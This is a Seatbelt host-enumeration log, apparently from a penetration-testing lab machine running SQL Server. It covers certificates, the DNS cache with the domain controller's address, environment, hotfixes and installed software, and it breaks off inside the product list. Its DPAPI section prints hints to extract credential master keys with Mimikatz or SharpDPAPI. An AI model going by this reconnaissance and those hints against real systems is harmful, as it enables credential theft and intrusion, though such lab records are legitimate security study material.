CurrentUser\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
CurrentUser\AuthRoot - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
CurrentUser\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
LocalMachine\AuthRoot - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 4:59:00 PM
LocalMachine\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
LocalMachine\AuthRoot - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
LocalMachine\AuthRoot - B31EB1B740E36C8402DADC37D44DF5D4674952F9 (Entrust Root Certification Authority) 11/27/2026 12:53:42 PM
LocalMachine\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
LocalMachine\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 9F744E9F2B4DBAEC0F312C50B6563B8E2D93C311 (COMODO ECC Certification Authority) 1/18/2038 3:59:59 PM
LocalMachine\AuthRoot - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
LocalMachine\AuthRoot - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
LocalMachine\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
====== ChromiumBookmarks ======

====== ChromiumHistory ======

====== ChromiumPresence ======

====== CloudCredentials ======

====== CloudSyncProviders ======

====== CredEnum ======

ERROR:   [!] Terminating exception running command 'CredEnum': System.ComponentModel.Win32Exception (0x80004005): Element not found
   at Seatbelt.Commands.Windows.CredEnumCommand.<Execute>d__9.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== CredGuard ======

====== dir ======

  LastAccess LastWrite  Size      Path

  22-09-29   22-09-29   0B        C:\Users\Public\Documents\My Music\
  22-09-29   22-09-29   0B        C:\Users\Public\Documents\My Pictures\
  22-09-29   22-09-29   0B        C:\Users\Public\Documents\My Videos\
  22-09-29   22-09-29   0B        C:\Users\Default\Documents\My Music\
  22-09-29   22-09-29   0B        C:\Users\Default\Documents\My Pictures\
  22-09-29   22-09-29   0B        C:\Users\Default\Documents\My Videos\
====== DNSCache ======

  Entry                          : dc01.medtech.com
  Name                           : dc01.medtech.com
  Data                           : 172.16.250.10

  Entry                          : dc01.medtech.com
  Name                           : dc01.medtech.com
  Data                           : 172.16.250.10

  Entry                          : crl4.digicert.com
  Name                           : crl4.digicert.com
  Data                           : crl.edge.digicert.com

  Entry                          : crl4.digicert.com
  Name                           : crl.edge.digicert.com
  Data                           : fp2e7a.wpc.2be4.phicdn.net

  Entry                          : crl4.digicert.com
  Name                           : fp2e7a.wpc.2be4.phicdn.net
  Data                           : fp2e7a.wpc.phicdn.net

  Entry                          : crl4.digicert.com
  Name                           : fp2e7a.wpc.phicdn.net
  Data                           : 192.229.211.108

====== DotNet ======

  Installed CLR Versions
      4.0.30319

  Installed .NET Versions
      4.8.04161

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : True
        [!] The highest .NET version is enrolled in AMSI!
====== DpapiMasterKeys ======


  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/pvk or /rpc) to decrypt
  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz "sekurlsa::dpapi" module
  [*] You can also use SharpDPAPI for masterkey retrieval.
====== Dsregcmd ======

ERROR: Unable to collect. No relevant information were returned
====== EnvironmentPath ======

  Name                           : C:\Windows\system32
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\Wbem
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\WindowsPowerShell\v1.0\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\OpenSSH\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\150\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\150\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Azure Data Studio\bin
  SDDL                           : O:BAD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Local\Microsoft\WindowsApps
  SDDL                           : O:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133D:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133)

====== EnvironmentVariables ======

  <SYSTEM>                           ComSpec                            %SystemRoot%\system32\cmd.exe
  <SYSTEM>                           DriverData                         C:\Windows\System32\Drivers\DriverData
  <SYSTEM>                           OS                                 Windows_NT
  <SYSTEM>                           Path                               %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\DTS\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\;C:\Program Files\Azure Data Studio\bin
  <SYSTEM>                           PATHEXT                            .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  <SYSTEM>                           PROCESSOR_ARCHITECTURE             AMD64
  <SYSTEM>                           PSModulePath                       %ProgramFiles%\WindowsPowerShell\Modules;%SystemRoot%\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\
  <SYSTEM>                           TEMP                               %SystemRoot%\TEMP
  <SYSTEM>                           TMP                                %SystemRoot%\TEMP
  <SYSTEM>                           USERNAME                           SYSTEM
  <SYSTEM>                           windir                             %SystemRoot%
  <SYSTEM>                           NUMBER_OF_PROCESSORS               2
  <SYSTEM>                           PROCESSOR_LEVEL                    23
  <SYSTEM>                           PROCESSOR_IDENTIFIER               AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
  <SYSTEM>                           PROCESSOR_REVISION                 0102
  NT AUTHORITY\SYSTEM                Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  NT AUTHORITY\SYSTEM                TEMP                               %USERPROFILE%\AppData\Local\Temp
  NT AUTHORITY\SYSTEM                TMP                                %USERPROFILE%\AppData\Local\Temp
  NT Service\MSSQL$SQLEXPRESS        Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  NT Service\MSSQL$SQLEXPRESS        TEMP                               %USERPROFILE%\AppData\Local\Temp
  NT Service\MSSQL$SQLEXPRESS        TMP                                %USERPROFILE%\AppData\Local\Temp
====== ExplicitLogonEvents ======

ERROR: Unable to collect. Must be an administrator.
====== ExplorerMRUs ======

====== ExplorerRunCommands ======

====== FileInfo ======

  Comments                       : 
  CompanyName                    : Microsoft Corporation
  FileDescription                : NT Kernel & System
  FileName                       : C:\Windows\system32\ntoskrnl.exe
  FileVersion                    : 10.0.20348.1006 (WinBuild.160101.0800)
  InternalName                   : ntkrnlmp.exe
  IsDebug                        : False
  IsDotNet                       : False
  IsPatched                      : False
  IsPreRelease                   : False
  IsPrivateBuild                 : False
  IsSpecialBuild                 : False
  Language                       : English (United States)
  LegalCopyright                 : c Microsoft Corporation. All rights reserved.
  LegalTrademarks                : 
  OriginalFilename               : ntkrnlmp.exe
  PrivateBuild                   : 
  ProductName                    : Microsoftr Windowsr Operating System
  ProductVersion                 : 10.0.20348.1006
  SpecialBuild                   : 
  Attributes                     : Archive
  CreationTimeUtc                : 10/3/2022 4:32:13 PM
  LastAccessTimeUtc              : 10/3/2022 4:32:14 PM
  LastWriteTimeUtc               : 10/3/2022 4:32:14 PM
  Length                         : 11601232
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)

====== FileZilla ======

====== FirefoxHistory ======

====== FirefoxPresence ======

====== Hotfixes ======

Enumerating Windows Hotfixes. For *all* Microsoft updates, use the 'MicrosoftUpdates' command.

  KB5017265  10/3/2022 12:00:00 AM  Update                         NT AUTHORITY\SYSTEM
  KB5012170  10/3/2022 12:00:00 AM  Security Update                WEB02\Administrator
  KB5017316  10/3/2022 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
  KB5016704  10/3/2022 12:00:00 AM  Update                         NT AUTHORITY\SYSTEM
====== IdleTime ======

  CurrentUser : NT Service\MSSQL$SQLEXPRESS
  Idletime    : 01h:02m:37s:250ms (3757250 milliseconds)

====== IEFavorites ======

====== IETabs ======

ERROR:   [!] Terminating exception running command 'IETabs': System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.UnauthorizedAccessException: Access is denied.

   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at Seatbelt.Commands.Browser.InternetExplorerTabCommand.<Execute>d__9.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== IEUrls ======

Internet Explorer typed URLs for the last 7 days

====== InstalledProducts ======

  DisplayName                    : Microsoft Edge
  DisplayVersion                 : 110.0.1587.57
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Edge Update
  DisplayVersion                 : 1.3.173.45
  Publisher                      : 
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Help Viewer 2.3
  DisplayVersion                 : 2.3.28307
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
  DisplayVersion                 : 14.28.29913.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server Management Studio - 18.12.1
  DisplayVersion                 : 15.0.18424.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913
  DisplayVersion                 : 14.28.29913
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Browser for SQL Server 2019
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913
  DisplayVersion                 : 14.28.29913
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40664
  DisplayVersion                 : 12.0.40664
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913
  DisplayVersion                 : 14.28.29913.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Analysis Services OLE DB Provider
  DisplayVersion                 : 15.0.2000.832
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual Studio Tools for Applications 2017 x86 Hosting Support
  DisplayVersion                 : 15.0.27520
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Integration Services
  DisplayVersion                 : 15.0.2000.229
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Help Viewer 2.3
  DisplayVersion                 : 2.3.28307
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.40664
  DisplayVersion                 : 12.0.40664.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Visual Studio 2017 Isolated Shell for SSMS
  DisplayVersion                 : 15.0.28307.421
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.40664
  DisplayVersion                 : 12.0.40664
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual Studio Tools for Applications 2017
  DisplayVersion                 : 15.0.27520
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server 2019 (64-bit)
  DisplayVersion                 : 
  Publisher                      : 
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2019 (64-bit)
  DisplayVersion                 : 
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Common Files
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2019 Setup (English)
  DisplayVersion                 : 15.0.4013.40
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 XEvent
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 XEvent
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio for Analysis Services
  DisplayVersion                 : 15.0.18424.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 SQL Diagnostics
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft VSS Writer for SQL Server 2019
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2019 T-SQL Language Service 
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : VMware Tools
  DisplayVersion                 : 11.3.0.18090558
  Publisher                      : VMware, Inc.
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2019 RsFx Driver
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Common Files
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Database Engine Shared
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913
  DisplayVersion                 : 14.28.29913
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Shared Management Objects
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Azure Data Studio
  DisplayVersion                 : 1.37.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Analysis Services OLE DB Provider
  DisplayVersion                 : 15.0.2000.832
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 DMF
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio
  DisplayVersion                 : 15.0.18424.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft ODBC Driver 17 for SQL Server
  DisplayVersion                 : 17.7.2.1
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Shared Management Objects Extensions
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Connection Info
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft OLE DB Driver for SQL Server
  DisplayVersion                 : 18.5.0.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2012 Native Client 
  DisplayVersion                 : 11.4.7462.6
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Database Engine Services
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Shared Management Objects
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual Studio Tools for Applications 2017 x64 Hosting Support
  DisplayVersion                 : 15.0.27520
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SSMS Post Install Tasks
  DisplayVersion                 : 15.0.18424.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Shared Management Objects Extensions
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Batch Parser
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Database Engine Shared
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2019 Database Engine Services
  DisplayVersion                 : 15.0.2000.5
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio for Reporting Services
  DisplayVersion                 : 15.0.18424.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio
  DisplayVersion                 : 15.0.18424.0
  Publisher                      : Microsoft Corporation
